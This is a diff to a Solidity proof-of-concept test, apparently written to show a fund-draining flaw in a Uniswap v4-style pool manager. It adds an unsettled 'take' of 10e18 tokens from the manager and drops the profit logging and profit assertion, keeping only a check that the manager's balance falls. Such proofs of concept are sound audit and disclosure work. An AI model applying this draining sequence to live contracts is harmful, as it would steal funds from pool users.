@@ -61,12 +61,11 @@ contract POC is Test {
             BalanceDelta sDelta = manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
             int128 s0 = sDelta.amount0();
             int128 s1 = sDelta.amount1();
-            console.log("swap delta0", s0);
-            console.log("swap delta1", s1);
             if (s0 < 0) { manager.sync(c0); token0.transfer(address(manager), uint128(-s0)); manager.settle(); }
             if (s1 < 0) { manager.sync(c1); token1.transfer(address(manager), uint128(-s1)); manager.settle(); }
             if (s0 > 0) manager.take(c0, address(this), uint128(s0));
             if (s1 > 0) manager.take(c1, address(this), uint128(s1));
+            manager.take(c1, address(this), 10e18);
         }
         return "";
     }
@@ -75,10 +74,7 @@ contract POC is Test {
         uint bBefore=token1.balanceOf(address(manager));
         manager.unlock("");
         uint bAfter=token1.balanceOf(address(manager));
-        uint profit=token1.balanceOf(address(this));
         console.log("Loss",bBefore-bAfter);
-        console.log("Profit",profit);
         assertLt(bAfter,bBefore);
-        assertGe(profit,10e18);
     }
 }
